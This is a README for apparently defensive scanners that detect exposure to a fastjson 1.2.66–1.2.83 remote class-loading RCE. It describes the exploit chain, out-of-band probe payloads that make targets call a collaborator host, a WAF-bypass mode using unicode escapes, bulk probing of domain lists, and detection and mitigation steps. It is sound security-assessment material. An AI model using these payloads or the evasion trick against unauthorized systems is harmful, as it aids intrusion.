# fastjson `@JSONType` remote-class-load RCE — environment scanner

Detects exposure to the fastjson 1.2.66–1.2.83 `@JSONType` resource-probe RCE
(`checkAutoType` fetches `typeName.replace('.','/')+".class"`; a crafted `@type`
`jar:http:..<int-ip>:<port>.<tok>!.POC` becomes a remote `jar:` URL that a Spring
Boot `LaunchedURLClassLoader` fetches → `defineClass` → `<clinit>` = RCE). Fires
with **autoType off** and through `parseObject(body, Dto.class)` ("binding is not a
mitigation"). Lab-reproduced; see `../TYPED_BIND_FINDINGS.md`.

**Exposure = ALL of:** fastjson **1.2.66–1.2.83** on classpath · a classloader that
resolves `jar:http://` resource names (**Spring Boot fat-jar** `LaunchedURLClassLoader`)
· untrusted JSON reaching a parse · HTTP egress. **JDK 8 → RCE; JDK 9+ → SSRF only**
(crafted internal name rejected at `defineClass`).

## Tools (Python 3 stdlib only — no install)

### 1. `fjscan_static.py` — inventory (no traffic to apps)
Walks jars/wars/ears (or dirs) and flags the vulnerable *combination*.
```
python3 fjscan_static.py /path/to/artifacts /path/to/app.jar
python3 fjscan_static.py --json /srv/deployments > exposure.json   # CI gate: exit 2 if EXPOSED
```
Verdicts: `EXPOSED` (fastjson 1.2.66–83 + SB fat-jar loader) · `REVIEW` (1.2.x out of
tested range, or unknown/shaded) · `FASTJSON_NO_SB` (fastjson at risk, no fat-jar loader
here — still check the app's actual classloader) · `FASTJSON2_OR_SAFE` · `NO_FASTJSON`.
Recurses `BOOT-INF/lib`, `WEB-INF/lib`, `lib`. Reads `Build-Jdk` as a hint — **confirm
the runtime JDK on the host** (`java -version`; 8 = RCE).

### 2. `fjscan_probe.py` — active, SAFE reachability proof
Sends the crafted `@type` at a canary you control; a callback = the vulnerable path is
reachable. **Serves nothing (404) → SSRF only, never RCE.** Authorized targets only.
```
# self-contained canary (run on a host targets can reach):
python3 fjscan_probe.py --canary-ip <this-host-ip> --listen-port 19000 --targets targets.txt

# external Burp Collaborator / interactsh:
python3 fjscan_probe.py --collaborator <ip|int|host|collab-sub> --port 80 --targets targets.txt
```
`targets.txt`: one target per line (`-` = stdin). Each line is a full `[METHOD ]URL` **or a
bare domain** — bare domains are expanded with `--scheme` / `--target-port` / `--path`
(default `http` + `/parse`), so you can feed a plain domain list:
```
# domains.txt
api.internal.example
POST https://svc.example/v1/ingest
10.0.0.7:8080
```
```
python3 fjscan_probe.py --collaborator <collab> --targets domains.txt --path /api/parse
cat domains.txt | python3 fjscan_probe.py --collaborator <collab> --targets -
```
Nest the probe in a field with `--wrap '{"name":{{P}}}'`. Each target gets a unique token, so
callbacks map back to the exact domain. Requests are sent **concurrently** — tune with
`--threads N` (default 20). Exit 2 if any target calls back. `fjscan_static.py` is likewise
parallel (`--threads N`, default 8) for large artifact trees.

**`--probe-type` — which OOB primitive to send (important for Burp Collaborator):**

| value | payload | fires a **dotted** Collaborator? | proves |
|---|---|---|---|
| `jsontype` (default) | `@JSONType` `jar:http://<int-ip>…` | **no** — dots→slashes forces an int-IP host, so a public Collaborator can't attribute it; use a raw-IP listener you own | the RCE path is reachable |
| `dns` | `{"@type":"java.net.Inet4Address","val":"<tok>.<collab>"}` | **yes** — accepts a dotted host, works with autoType off | fastjson present + processes `@type` + host has egress (prerequisite) |
| `both` | sends each | — | — |

```
# Confirm fastjson + egress against a Burp Collaborator subdomain:
python3 fjscan_probe.py --collaborator <sub>.oastify.com --probe-type dns --targets domains.txt
```
Watch your Collaborator for **`<tok>.<sub>.oastify.com`** DNS/HTTP interactions — the `<tok>`
prefix encodes which target called back. For the RCE-path (`jsontype`) callback you need an OOB
listener addressable by a **raw IPv4** (encoded as an integer), since a dotted Collaborator host
cannot survive the sink.

**CDN/WAF-fronted targets** (common on public endpoints): bare HTTP clients often get a
`405`/`403` *before* the request reaches the app, so `@type` is never parsed — an inconclusive
result, not a clean bill of health. A browser `User-Agent` is sent by default; add
`--header 'K: V'` (repeatable, e.g. `Origin`, `Referer`, cookies) and `--baseline '{"a":1}'` to
send a benign control body per target. If the **baseline** gets a normal app response
(`200`/`400`/`500`) but the **probe** is blocked, a WAF is filtering the `@type`; if **both** are
blocked, it's the CDN/path/method, not the app.

When a WAF blocks the `@type`, use **`--evasion`** — fastjson's lexer decodes `\uXXXX` inside
field names and string values, so an escaped payload still binds while a keyword-matching WAF
misses it: `ukey` escapes the `@type` key, `uval` escapes the class name, `both` does both.
```
python3 fjscan_probe.py --collaborator <sub>.oastify.com --probe-type dns --evasion both \
    --baseline '{"a":1}' --targets domains.txt
```
A DNS callback appearing **only with `--evasion`** = fastjson is present behind a bypassable WAF.

**Bulk payloads for manual Burp testing** — `fjpayload.py --targets-file` emits one payload per
domain with a stable per-target token (`fj<sha1>`):
```
python3 fjpayload.py <collab> --targets-file domains.txt         # or -f -   for stdin
```

### 3. `fjpayload.py` — one-shot payload generator (manual Burp Repeater)
```
python3 fjpayload.py <collaborator> [--port N] [--token T] [--wrap '{"u":{{P}}}']
```

## The Collaborator / dotted-host constraint (important)
The sink does `typeName.replace('.','/')`, so **every dot in the host becomes a slash** —
a dotted hostname (`abc.oastify.com`) turns into `abc/oastify/com` and never resolves.
The tools therefore encode the callback host as a **decimal integer** (`127.0.0.1`→
`2130706433`). A dotted Burp Collaborator subdomain is auto-resolved to its IPv4 and
encoded the same way; **DNS-subdomain correlation will NOT fire** — correlate instead on
the unique **URL path token** the tools embed (Burp shows it in the HTTP interaction), or
use a private Collaborator / interactsh reachable by IP.

## Recommended fleet workflow
1. `fjscan_static.py` across build artifacts / container images / registries → `EXPOSED` list.
2. For each `EXPOSED` host, confirm runtime `java -version` (8 = RCE, 9+ = SSRF).
3. `fjscan_probe.py` against the live endpoints to prove reachability (SSRF callback).
4. Detection/mitigation: alert on `@type` containing `jar:`,`!`,`..`, or integer-IP literals;
   `-Dfastjson.parser.safeMode=true`; restrict egress; move to JDK 9+; migrate off fastjson 1.x.

## Validation
Proven against a true-positive (Spring Boot `LaunchedURLClassLoader` +
`parseObject(body,Dto.class)`) and a true-negative (plain AppClassLoader) on a JDK 8 test host:
static → `EXPOSED` vs `FASTJSON_NO_SB`; probe → `VULNERABLE` vs `no-callback`. Reproduce the
targets with the Docker lab in this repo (`make up`).
```
